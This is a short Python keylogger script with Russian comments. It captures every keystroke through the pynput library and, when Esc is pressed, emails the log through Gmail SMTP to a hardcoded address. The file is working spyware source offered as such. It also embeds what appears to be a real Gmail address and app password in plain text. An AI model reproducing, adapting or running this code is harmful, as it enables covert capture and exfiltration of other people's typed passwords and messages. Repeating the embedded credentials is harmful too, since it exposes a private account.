import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

# Массив для хранения логов
log_data = []

# Настройки Gmail
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'artemmozol232@gmail.com'
smtp_password = 'uded fmsq fvba avoa'
sender_email = 'artemmozol232@gmail.com'
recipient_email = 'artemmozol232@gmail.com'

def send_email(log_data):
    try:
        msg_content = ''.join(log_data)
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = 'Keylogger Logs'
        msg.attach(MIMEText(msg_content, 'plain'))

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

def on_press(key):
    try:
        log_data.append(key.char)
    except AttributeError:
        if key == Key.space:
            log_data.append(" ")
        elif key == Key.enter:
            log_data.append("\n")
        else:
            log_data.append(f" {key} ")

def on_release(key):
    if key == Key.esc:
        # Отправить лог на почту и очистить массив
        send_email(log_data)
        log_data.clear()
        # Остановить кейлоггер
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
